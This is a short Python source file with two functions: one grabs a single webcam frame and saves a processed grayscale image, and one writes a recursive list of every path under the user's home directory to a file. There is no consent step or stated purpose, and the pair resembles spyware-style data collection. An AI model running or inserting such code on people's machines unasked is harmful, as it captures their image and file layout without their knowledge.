import pathlib

import cv2

from conf.config import cfg

def takeCaption():
    caption = cv2.VideoCapture(index=0)
    _,image = caption.read()
    image = cv2.cvtColor(src=image,
                        code=cv2.COLOR_BGR2GRAY)
    image = cv2.resize(src=image,
                    dsize=(cfg.imgsize,cfg.imgsize),
                    fx=0,fy=0,
                    interpolation=cv2.INTER_AREA)
    image = cv2.filter2D(src=image,
                        ddepth=-1,
                        kernel=cfg.kernel)
    cv2.imwrite(filename=cfg.imgfilename,
                img=image)
    pass

def logHomeContents():
    with open(file=cfg.recfilename,
              mode='w',
              encoding='utf8') as f:
        for path in pathlib.Path.home().rglob(pattern='*'):
            f.write(f'{path.__str__()}\n')
    pass
